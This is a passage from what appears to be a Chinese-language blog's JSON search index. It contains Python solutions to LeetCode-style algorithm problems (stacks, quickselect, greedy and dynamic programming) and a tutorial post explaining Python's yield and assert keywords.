stack.append(i) return not stack 最小栈 设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈。实现 MinStack 类: 12345- `MinStack()` 初始化堆栈对象。- `void push(int val)` 将元素val推入堆栈。- `void pop()` 删除堆栈顶部的元素。- `int top()` 获取堆栈顶部的元素。- `int getMin()` 获取堆栈中的最小元素。 12345678910111213141516171819class MinStack: def __init__(self): self.stack = [] self.min_stack = [math.inf] def push(self, val: int) -&gt; None: self.stack.append(val) self.min_stack.append(min(val,self.min_stack[-1])) def pop(self) -&gt; None: self.stack.pop() self.min_stack.pop() def top(self) -&gt; int: return self.stack[-1] def getMin(self) -&gt; int: return self.min_stack[-1] 堆 数组中的第k个最大元素 给定整数数组 nums 和整数 k，请返回数组中第 **k** 个最大的元素。请注意，你需要找的是数组排序后的第 k 个最大的元素，而不是第 k 个不同的元素。 你必须设计并实现时间复杂度为 O(n) 的算法解决此问题。 1234567891011121314151617181920212223242526272829303132333435class Solution: def findKthLargest(self, nums: List[int], k: int) -&gt; int: # 定义快速选择函数 def quick_select(nums, k): # 随机选择一个基准元素（pivot） pivot = random.choice(nums) # 初始化三个列表/变量： # - big：存储比 pivot 大的元素 # - equal：记录与 pivot 相等的元素个数 # - small：存储比 pivot 小的元素 big, equal, small = [], 0, [] # 遍历数组，将元素分类 for num in nums: if num &gt; pivot: big.append(num) # 比 pivot 大的元素放入 big elif num &lt; pivot: small.append(num) # 比 pivot 小的元素放入 small else: equal += 1 # 与 pivot 相等的元素计数 # 如果 k 小于等于 big 的长度，说明第 k 个最大元素在 big 中 if k &lt;= len(big): return quick_select(big, k) # 递归在 big 中查找 # 如果 k 大于 big 和 equal 的总长度，说明第 k 个最大元素在 small 中 if len(big) + equal &lt; k: return quick_select(small, k - len(big) - equal) # 递归在 small 中查找 # 如果以上条件都不满足，说明第 k 个最大元素就是 pivot return pivot # 调用快速选择函数，返回第 k 个最大元素 return quick_select(nums, k) 前k个高频元素 给你一个整数数组 nums 和一个整数 k ，请你返回其中出现频率前 k 高的元素。你可以按 任意顺序 返回答案。 1234class Solution: def topKFrequent(self, nums: List[int], k: int) -&gt; List[int]: count = collections.Counter(nums) return [item[0] for item in count.most_common(k)] 贪心算法 买卖股票的最佳时期 给定一个数组 prices ，它的第 i 个元素 prices[i] 表示一支给定股票第 i 天的价格。你只能选择 某一天 买入这只股票，并选择在 未来的某一个不同的日子 卖出该股票。设计一个算法来计算你所能获取的最大利润。返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 0 。 123456789101112class Solution: def maxProfit(self, prices: List[int]) -&gt; int: profit = 0 low=high=prices[0] for p in prices: if p &lt; low: #对每个新的最低点来说，之前的最高点不再有效，需要结利 profit = max(profit, high-low) low=high=p elif p &gt; high: high=p profit = max(profit, high-low) return profit 跳跃游戏 给你一个非负整数数组 nums ，你最初位于数组的 第一个下标 。数组中的每个元素代表你在该位置可以跳跃的最大长度。判断你是否能够到达最后一个下标，如果可以，返回 true ；否则，返回 false 。 123456789class Solution: def canJump(self, nums: List[int]) -&gt; bool: if not nums :return False maxlong,n= 0,len(nums) for i in range(n): if i&gt;maxlong: return False maxlong= max(i+nums[i],maxlong) return True 动态规划 爬楼梯 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？ 123456class Solution: def climbStairs(self, n: int) -&gt; int: a, b = 1, 1 for _ in range(n - 1): a, b = b, a + b return b 杨辉三角 给定一个非负整数 *numRows，*生成「杨辉三角」的前 numRows 行。 12345678class Solution: def generate(self, numRows: int) -&gt; List[List[int]]: c = [[1] * (i + 1) for i in range(numRows)] for i in range(2, numRows): for j in range(1, i): # 左上方的数 + 正上方的数 c[i][j] = c[i - 1][j - 1] + c[i - 1][j] return c 多维动态规划 不同路径 一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。问总共有多少条不同的路径？ 1234567class Solution: def uniquePaths(self, m: int, n: int) -&gt; int: f = [1] * n for i in range(1, m): for j in range(1, n): f[j] += f[j - 1] return f[n - 1] 最小路径和 给定一个包含非负整数的 *m* x *n* 网格 grid ，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。**说明：**每次只能向下或者向右移动一步。 12345678910111213141516171819202122232425262728293031class Solution: def minPathSum(self, grid: List[List[int]]) -&gt; int: # 如果网格为空，返回 0 if not grid or not grid[0]: return 0 # 获取网格的行数和列数 rows, columns = len(grid), len(grid[0]) # 初始化动态规划数组 dp dp = [[0] * columns for _ in range(rows)] # 起点的最小路径和就是 grid[0][0] dp[0][0] = grid[0][0] # 初始化第一列的最小路径和 for i in range(1, rows): dp[i][0] = dp[i - 1][0] + grid[i][0] # 初始化第一行的最小路径和 for j in range(1, columns): dp[0][j] = dp[0][j - 1] + grid[0][j] # 填充 dp 数组的其余部分 for i in range(1, rows): for j in range(1, columns): # 当前点的最小路径和等于上方或左方的最小路径和加上当前点的值 dp[i][j] = min(dp[i - 1][j], dp[i][j - 1]) + grid[i][j] # 返回右下角的最小路径和 return dp[rows - 1][columns - 1]","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"Python 基础","slug":"Python-基础","date":"2025-02-04T08:29:02.000Z","updated":"2025-02-04T09:51:57.109Z","comments":true,"path":"2025/02/04/Python-基础/","permalink":"http://example.com/2025/02/04/Python-%E5%9F%BA%E7%A1%80/","excerpt":"","text":"关键字 yield yield 是 Python 中的一个关键字，用于定义生成器函数（generator function）。生成器函数是一种特殊的函数，它可以逐步产生值，而不是一次性返回所有结果。yield 的作用是将函数变成一个生成器，每次调用生成器的 __next__() 方法时，函数会执行到 yield 语句并返回一个值，然后暂停执行，直到下一次调用。 yield 的基本用法 示例 1：简单的生成器函数 12345678910def simple_generator(): yield 1 yield 2 yield 3# 使用生成器gen = simple_generator()print(next(gen)) # 输出: 1print(next(gen)) # 输出: 2print(next(gen)) # 输出: 3 每次调用 next(gen)，函数会从上次暂停的地方继续执行，直到遇到下一个 yield。 当没有更多的值可以生成时，会抛出 StopIteration 异常。 示例 2：使用 for 循环遍历生成器 12345678def simple_generator(): yield 1 yield 2 yield 3# 使用 for 循环遍历生成器for value in simple_generator(): print(value) 输出： 123123 for 循环会自动处理 StopIteration 异常，因此不需要手动调用 next()。 yield 的优势 惰性求值： 生成器不会一次性生成所有值，而是按需生成，节省内存。 适合处理大量数据或无限序列。 代码简洁： 使用 yield 可以避免手动实现迭代器协议（__iter__ 和 __next__）。 状态保持： 生成器函数会记住上次执行的状态，下次调用时从上次暂停的地方继续。 yield 的高级用法 示例 3：生成无限序列 123456789101112def infinite_sequence(): num = 0 while True: yield num num += 1# 使用生成器gen = infinite_sequence()print(next(gen)) # 输出: 0print(next(gen)) # 输出: 1print(next(gen)) # 输出: 2# 可以无限调用 next(gen) 这个生成器会无限生成递增的整数。 示例 4：使用 yield 实现斐波那契数列 12345678910def fibonacci(): a, b = 0, 1 while True: yield a a, b = b, a + b# 使用生成器gen = fibonacci()for _ in range(10): print(next(gen)) 输出： 123456789100112358132134 这个生成器会无限生成斐波那契数列的值。 示例 5：yield from（委托生成器） yield from 用于将生成器的控制权委托给另一个生成器。 123456789101112def sub_generator(): yield 1 yield 2def main_generator(): yield &#x27;Start&#x27; yield from sub_generator() yield &#x27;End&#x27;# 使用生成器for value in main_generator(): print(value) 输出： 1234Start12End yield from 可以简化生成器的嵌套调用。 yield 与 return 的区别 特性 yield return 返回值 每次生成一个值，函数暂停 返回一个值，函数结束 状态保持 函数状态会被保存 函数状态不会被保存 适用场景 生成器函数 普通函数 内存占用 惰性求值，节省内存 一次性返回所有结果，占用内存 总结 yield 是 Python 中实现生成器的关键，适合处理大量数据或需要惰性求值的场景。 生成器函数通过 yield 逐步返回值，并保持函数状态，直到生成所有值。 yield from 可以简化生成器的嵌套调用。 assert assert 是 Python 中的一个关键字，用于调试和测试代码。它的作用是检查某个条件是否为真，如果条件为假，则会触发 AssertionError 异常。assert 通常用于确保程序在某个关键点的状态符合预期，如果不符合，则立即停止程序并抛出错误。 assert 的基本语法 1assert condition, message condition：需要检查的条件表达式。如果为 True，程序继续执行；如果为 False，则抛出 AssertionError。 message（可选）：当条件为 False 时，抛出的异常信息。如果未提供，则使用默认的 AssertionError。 assert 的作用 调试工具： 用于在开发阶段检查代码逻辑是否正确。 如果条件不满足，程序会立即停止，方便定位问题。 测试工具： 在单元测试中，用于验证函数的输出是否符合预期。 文档工具： 通过 assert 可以清晰地表达代码的预期行为。 assert 的示例 示例 1：简单的 assert 用法 12x = 10assert x == 10, &quot;x 应该等于 10&quot; 如果 x == 10 为 True，程序继续执行。 如果 x == 10 为 False，则抛出 AssertionError，并显示消息 &quot;x 应该等于 10&quot;。 示例 2：检查函数返回值 123456def divide(a, b): assert b != 0, &quot;除数不能为 0&quot; return a / bprint(divide(10, 2)) # 输出: 5.0print(divide(10, 0)) # 触发 AssertionError: 除数不能为 0 在函数中使用 assert 可以确保输入参数的有效性。 示例 3：检查列表是否非空 1234567def process_list(items): assert len(items) &gt; 0, &quot;列表不能为空&quot; for item in items: print(item)process_list([1, 2, 3]) # 正常执行process_list([]) # 触发 AssertionError: 列表不能为空 assert 的注意事项 不要用于数据验证： assert 主要用于调试和测试，不应该用于检查用户输入或外部数据。 因为 Python 可以通过 -O（优化模式）运行，此时所有的 assert 语句会被忽略。 避免副作用： assert 的条件表达式不应该包含有副作用的操作（如修改全局变量、调用函数等），因为在优化模式下这些操作会被跳过。 替代方案： 对于数据验证或输入检查，应该使用 if 语句并手动抛出异常（如 ValueError、TypeError 等）。 assert 与 if 的区别 特性 assert if 用途 调试和测试 通用条件判断 触发异常 触发 AssertionError 需要手动抛出异常 优化模式 在 -O 模式下会被忽略 不受影响 适用场景 检查内部逻辑是否正确 检查用户输入或外部数据 assert 的优化模式 Python 支持以优化模式运行脚本，此时所有的 assert 语句会被忽略。可以通过以下命令启用优化模式： 1python -O script.py 在优化模式下，assert 语句不会被执行，因此不能依赖它来实现关键逻辑。 总结 assert 是一个强大的调试工具，用于检查代码逻辑是否符合预期。 它适合在开发和测试阶段使用，但不适合用于生产环境中的数据验证。 如果需要更健壮的输入检查，应该使用 if 语句并手动抛出异常。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]}],"categories":[],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"测试","slug":"测试","permalink":"http://example.com/tags/%E6%B5%8B%E8%AF%95/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]}